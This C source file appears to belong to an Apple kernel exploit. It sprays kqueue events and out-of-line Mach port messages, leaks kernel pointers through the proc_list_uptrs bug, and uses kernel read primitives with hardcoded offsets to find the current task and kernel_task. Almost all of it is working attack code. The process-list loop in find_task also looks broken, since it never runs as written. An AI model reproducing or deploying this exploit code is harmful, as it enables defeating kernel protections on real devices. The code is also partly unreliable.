#define KERNEL_TASKS_EXTERN

#include "tasks.h"

#include <stdio.h>
#include <stdlib.h>

#include <assert.h>
#include <unistd.h>

#include "kernel_memory.h"
#include "slide.h"

#define KEVENT_FLAG_WORKLOOP 0x400

typedef uint64_t kqueue_id_t;

struct kevent_qos_s {
    uint64_t ident; /* identifier for this event */
    int16_t filter; /* filter for event */
    uint16_t flags; /* general flags */
    uint32_t qos; /* quality of service when servicing event */
    uint64_t udata; /* opaque user data identifier */
    uint32_t fflags; /* filter-specific flags */
    uint32_t xflags; /* extra filter-specific flags */
    int64_t data; /* filter-specific data */
    uint64_t ext[4]; /* filter-specific extensions */
};

#include <sys/event.h>
#include <sys/time.h>
#include <sys/types.h>

struct kevent_extinfo {
    struct kevent_qos_s kqext_kev;
    uint64_t kqext_sdata;
    int kqext_status;
    int kqext_sfflags;
    uint64_t kqext_reserved[2];
};


extern int kevent_id(uint64_t id, 
					const struct kevent_qos_s* changelist, 
					int nchanges,
					struct kevent_qos_s* eventlist,
					int nevents,
					void* data_out,
					size_t* data_available,
					unsigned int flags);

int proc_list_uptrs(pid_t pid, uint64_t* buffer, uint32_t buffersize);

static void fill_events(int n_events)
{
	struct kevent_qos_s events_id [] = { 
	{
		.filter = EVFILT_USER,
        .ident = 1,
        .flags = EV_ADD,
        .udata = 0x2345
    } };

    kqueue_id_t id = 0x1234;

    for(int i = 0; i < n_events; i++)
    {
    	int error = kevent_id(id,
    						  events_id,
    						  1,	
    						  NULL,
    						  0,
    						  NULL,
    						  NULL,
    						  KEVENT_FLAG_WORKLOOP | KEVENT_FLAG_IMMEDIATE);

    	if(error != 0)
    	{
    		fprintf(stderr, "failed to enqueue user event %llu/%d\n",events_id[0].ident, n_events);
    		exit(-1);
    	}

    	events_id[0].ident++;
    }

}

int kqueues_allocated = 0;

static void prepare_kqueue()
{
	if(kqueues_allocated)
		return;

	fill_events(10000);

	fprintf(stdout, "prepared kqueue\n");

	kqueues_allocated = 1;
}

static uint64_t try_leak(int count)
{
	int buf_size = (count * 8) + 7;

	char *buf = calloc(buf_size + 1, 1);

	int error = proc_list_uptrs(getpid(), (void*)buf, buf_size);

	if(error == -1)
	{
		fprintf(stderr, "%s failed!\n", "proc_list_uptrs");

		return 0;
	}

	uint64_t last_val = ((uint64_t*) buf)[count];

	return last_val;
}

struct ool_msg
{
	mach_msg_header_t hdr;
	mach_msg_body_t body;
	mach_msg_ool_ports_descriptor_t ool_ports;
};

static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)
{
	mach_port_t q = MACH_PORT_NULL;
	
	kern_return_t err;

	err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);

	if(err != KERN_SUCCESS)
	{
		fprintf(stderr, "failed to allocate new port\n");

		exit(-1);
	}

	mach_port_t *ports = malloc(sizeof(mach_port_t) * count);

	for(int i = 0; i < count; i++)
	{
		ports[i] = target_port;
	}

	struct ool_msg *msg = calloc(1, sizeof(struct ool_msg));

	msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;

    msg->body.msgh_descriptor_count = 1;

    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    err = mach_msg(&msg->hdr,
    				MACH_SEND_MSG| MACH_MSG_OPTION_NONE,
    				(mach_msg_size_t) sizeof(struct ool_msg),
    				0,
    				MACH_PORT_NULL,
    				MACH_MSG_TIMEOUT_NONE,
    				MACH_PORT_NULL);

    if(err != KERN_SUCCESS)
    {
    	fprintf(stderr, "failed to send message: %s\n", mach_error_string(err));

    	exit(-1);
    }

    return q;
}

static int uint64_t_compare(const void *a, const void *b)
{
	uint64_t a_val = (*(uint64_t*)a);
	uint64_t b_val = (*(uint64_t*)b);

	if(a_val < b_val)
		return -1;
	
	if(a_val == b_val)
		return 0;

	return 1;
}

uint64_t kernel_ipc_port_lookup_proc_list_uptrs_bug(mach_port_t port, int disposition)
{
	prepare_kqueue();

	int n_guesses = 100;

	uint64_t *guesses = calloc(1, n_guesses * sizeof(uint64_t));
	int valid_guesses = 0;

	for(int i = 1; i < n_guesses + 1; i++)
	{
		mach_port_t q = fill_kalloc_with_port_pointer(port, i, disposition);

		mach_port_destroy(mach_task_self(), q);

		uint64_t leaked = try_leak(i - 1);

		if((leaked < 0x00ffffff00000000) && (leaked > 0x00ffff0000000000))
			guesses[valid_guesses++] = leaked | 0xff00000000000000;
	}

	if(valid_guesses == 0)
	{
		fprintf(stderr, "proc_list_uptrs couldn't leak kernel pointers\n");
		
		exit(-1);
	}

	qsort(guesses, valid_guesses, sizeof(uint64_t), uint64_t_compare);

	uint64_t best_guess = guesses[0];
	int best_guess_count = 1;

	uint64_t current_guess = guesses[0];
	int current_guess_count = 1;

	for(int i = 1; i < valid_guesses; i++)
	{
		if(guesses[i] == guesses[i - 1])
		{
			current_guess_count++;

			if(current_guess_count > best_guess_count)
			{
				best_guess = current_guess;

				best_guess_count = current_guess_count;
			}
		} else 
		{
			current_guess = guesses[i];

			current_guess_count = 1;
		}
	}

	free(guesses);

	return best_guess;
}

bool
kernel_ipc_port_lookup(uint64_t task,
						mach_port_name_t port_name,
						uint64_t *ipc_port,
						uint64_t *ipc_entry)
{
	uint64_t itk_space = kernel_read64(task + OFFSET(task, itk_space));

	uint32_t is_table_size = kernel_read32(itk_space + OFFSET(ipc_space, is_table_size));

	uint32_t port_index = MACH_PORT_INDEX(port_name);

	if(port_index >= is_table_size)
		return false;

	uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));

	uint64_t entry = is_table + port_index * SIZE(ipc_entry);

	if(ipc_entry != NULL)
		*ipc_entry = entry;

	if(ipc_port != NULL)
		*ipc_port = kernel_read64(entry + OFFSET(ipc_entry, ie_object));

	return true;
}

uint64_t task_self_addr()
{
	return kernel_ipc_port_lookup_proc_list_uptrs_bug(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
}

bool
find_task(int pid, uint64_t *task)
{
	uint64_t ourproc;

	ourproc = kernel_read64(current_task + OFFSET(task, bsd_info));

	uint64_t current_proc = ourproc;
	uint64_t proc = 0;

	while(proc != 0)
	{
		if(proc == 0 || proc == -1)
			break;

		uint32_t proc_pid = kernel_read32(current_proc + OFFSET(proc, p_pid));

		if(proc_pid == pid)
			proc = current_proc;

		current_proc = kernel_read64(current_proc + OFFSET(proc,p_list_next));

		if(current_proc == ourproc)
			break;

	}

	if(proc != 0)
	{
		*task = kernel_read64(proc + OFFSET(proc, task));

		fprintf(stdout, "found task with pid %d at kaddress %p", pid, (void*)*task);

		return true;
	}

	return false;
}


bool
kernel_tasks_init()
{
	static bool initialized = false;

	if(initialized)
		return true;

	SIZE(ipc_entry)                         = 0x18;

	OFFSET(ipc_port, io_bits)				= 0x0;
	OFFSET(ipc_port, io_references)			= 0x4;
	OFFSET(ipc_port, ikmq_base) 			= 0x40;
	OFFSET(ipc_port, msg_count)				= 0x50;
	OFFSET(ipc_port, ip_receiver)			= 0x60;
	OFFSET(ipc_port, ip_kobject)			= 0x68;
	OFFSET(ipc_port, ip_context)			= 0x90;
	OFFSET(ipc_port, ip_srights)			= 0xa;

	OFFSET(ipc_entry, ie_object)            = 0;
	OFFSET(ipc_space, is_table_size)        = 0x14;
	OFFSET(ipc_space, is_table)             = 0x20;
	OFFSET(proc, p_list_next)               = 0;
	OFFSET(proc, task)                      = 0x10;
	OFFSET(proc, p_pid)                     = 0x68;

	OFFSET(task, lck_mtx_type) 				= 0xb;
	OFFSET(task, ref_count)					= 0x10;
	OFFSET(task, active) 					= 0x14;
	OFFSET(task, vm_map) 					= 0x20;
	OFFSET(task, next)						= 0x28;
  	OFFSET(task, prev)						= 0x30;
	OFFSET(task, itk_space)                 = 0x320;
	OFFSET(task, bsd_info)                  = 0x380;

	uint64_t task_kaddr = task_self_addr();

	if(task_kaddr == 0)
	{
		fprintf(stderr, "could not find task's kernel address\n");

		exit(-1);
	}

	current_task = task_kaddr;

	fprintf(stdout, "successfully found current_task kaddr\n");

	bool ok = find_task(0, &kernel_task);

	if(!ok)
	{
		return false;
	}

	fprintf(stdout, "successfully found kernel_task k_addr\n");

	initialized = true;

	return true;
}